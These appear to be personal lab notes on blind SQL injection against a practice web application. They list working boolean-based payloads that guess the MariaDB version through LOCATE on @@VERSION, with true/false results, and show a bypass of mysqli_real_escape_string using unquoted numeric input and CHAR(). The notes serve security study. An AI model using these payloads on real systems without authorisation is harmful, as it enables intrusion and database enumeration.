## Blind SQLi
- This one is purely based on trial and error, where you request a query that results true and then request a query that returns false. And by doing that we can eventually guess stuff.
- Below trial and error example is to get information regarding version of the data base
- Automated tool is done.
```
// ACTUAL VERSION - 10.4.17-MariaDB

1' AND LOCATE(10,@@VERSION); -- -      -> True

1' AND LOCATE(10.,@@VERSION); -- -      -> True

1' AND LOCATE(10.1,@@VERSION); -- -		-> False

1' AND LOCATE(10.4,@@VERSION); -- -      -> True

1' AND LOCATE(10.40,@@VERSION);-- -      -> False
1' AND LOCATE(10.41,@@VERSION);-- -      -> False
1' AND LOCATE(10.42,@@VERSION);-- -      -> False
1' AND LOCATE(10.43,@@VERSION);-- -      -> False
1' AND LOCATE(10.44,@@VERSION);-- -      -> False
1' AND LOCATE(10.45,@@VERSION);-- -      -> False
1' AND LOCATE(10.46,@@VERSION);-- -      -> False
1' AND LOCATE(10.47,@@VERSION);-- -      -> False
1' AND LOCATE(10.48,@@VERSION);-- -      -> False
1' AND LOCATE(10.49,@@VERSION);-- -      -> False

1' AND LOCATE("10.4.",@@VERSION);-- -      -> True

1' AND LOCATE("10.4.0",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.1",@@VERSION);-- -   -> True
1' AND LOCATE("10.4.2",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.3",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.4",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.5",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.6",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.7",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.8",@@VERSION);-- -   -> False
1' AND LOCATE("10.4.9",@@VERSION);-- -   -> False

10.4.1

1' AND LOCATE("10.4.10",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.11",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.12",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.13",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.14",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.15",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.16",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.17",@@VERSION);-- -  -> True
1' AND LOCATE("10.4.18",@@VERSION);-- -  -> False
1' AND LOCATE("10.4.19",@@VERSION);-- -  -> False

10.4.17

1' AND LOCATE("10.4.17.",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.170",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.171",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.172",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.173",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.174",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.175",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.176",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.177",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.178",@@VERSION);-- -         -> False
1' AND LOCATE("10.4.179",@@VERSION);-- -         -> False

1' AND @@VERSION="10.4.17-MariaDB";-- -			-> True

1' AND "10.4.17"=@@VERSION;-- -
```

## Low
- `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked

## Medium
- Here we had `mysqli_real_escape_string` trying to sanitize the input. However this could be easily bypassed. [[SQL-Injection/Examples]]
```
1 AND LOCATE(10,@@VERSION); -- -	-> True


1 AND LOCATE(10.4,@@VERSION); -- -	-> True


1 AND LOCATE(4.1,@@VERSION); -- -	-> True

1 AND LOCATE(4.17,@@VERSION); -- -	-> True
```

#### Better way
```
1 AND LOCATE(CONCAT(CHAR(77)),@@VERSION);-- -	-> True eheheheh

```
- Still gotta find a way to brute check string part of version.

## High
- `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
